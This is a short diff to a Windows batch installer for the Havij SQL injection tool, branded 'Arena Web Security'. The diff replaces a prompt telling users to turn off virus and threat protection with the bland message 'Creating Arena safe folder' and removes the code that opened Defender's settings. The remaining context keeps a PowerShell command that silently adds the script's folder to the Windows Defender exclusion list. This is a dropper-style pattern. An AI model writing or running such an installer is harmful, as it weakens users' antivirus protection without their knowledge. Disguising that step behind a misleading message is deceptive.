@@ -22,13 +22,8 @@ echo 	Havij Installer by Arena Web Security
 echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::
 echo.
 echo.
-echo Turn off every Virus and Threat Protection
+echo Creating Arena safe folder
 echo.
-
-set tCommand=
-for /f "tokens=*" %%i in ('echo %ProgramFiles%\Windows Defender\MSASCui.exe') do set tCommand=%%i
-if not exist "%tCommand%" set tCommand=windowsdefender://Threatsettings
-start "" "%tCommand%"
 
 :: Add the script path to Defender exclusion list
 powershell -Command "Add-MpPreference -ExclusionPath '%SCRIPT_PATH%'"
